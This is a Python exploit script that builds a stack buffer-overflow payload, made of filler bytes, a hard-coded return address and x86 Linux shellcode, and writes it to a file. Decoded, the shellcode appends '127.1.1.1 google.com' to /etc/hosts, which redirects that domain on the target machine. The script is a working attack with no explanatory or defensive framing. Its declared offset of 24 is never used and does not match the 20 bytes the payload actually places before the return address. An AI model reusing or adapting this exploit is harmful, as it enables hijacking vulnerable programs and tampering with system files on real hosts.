import struct

# Shellcode (paste the extracted shellcode here)
shellcode = b"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d"

# Buffer overflow parameters
buffer_size = 16
offset = 24  # Adjusted based on the assembly code
return_address = struct.pack("<I", 0x0804842c)  # Address of the ret instruction

# Construct the payload
payload = b"A" * buffer_size  # Fill the buffer
payload += b"B" * 4  # Overwrite the saved EBP
payload += return_address  # Overwrite the return address
payload += shellcode  # Append the shellcode

# Write payload to a file
with open("payload", "wb") as f:
    f.write(payload)

print("Exploit payload created successfully.")